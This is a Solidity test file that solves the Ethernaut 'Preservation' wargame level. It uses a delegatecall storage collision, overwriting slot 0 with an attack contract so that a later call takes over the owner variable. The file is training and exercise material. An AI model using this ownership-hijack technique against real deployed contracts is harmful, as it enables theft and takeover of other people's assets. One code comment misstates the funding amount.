// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/16-Preservation/PreservationFactory.sol';
import '../levels/16-Preservation/PreservationAttack.sol';
import '../core/Ethernaut.sol';

contract PreservationTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 100 ether); // fund our attacker contract with 1 ether
  }

  function testPreservationHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------

    PreservationFactory preservationFactory = new PreservationFactory();
    ethernaut.registerLevel(preservationFactory);
    vm.startPrank(attacker);
    address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(
      preservationFactory
    );
    Preservation preservationContract = Preservation(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    PreservationAttack preservationAttack = new PreservationAttack();

    // Overwrite Preservation contract slot 0 value with address of our
    // attack contract
    preservationContract.setFirstTime(
      uint256(uint160(address(preservationAttack)))
    );

    // The next call will be delegated to our attack contract with a malicious
    // setTime() function matching the required signature that will overwrite
    // Preservation slot 3 value (owner)
    preservationContract.setFirstTime(uint256(uint160(attacker)));

    assertEq(preservationContract.owner(), attacker);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
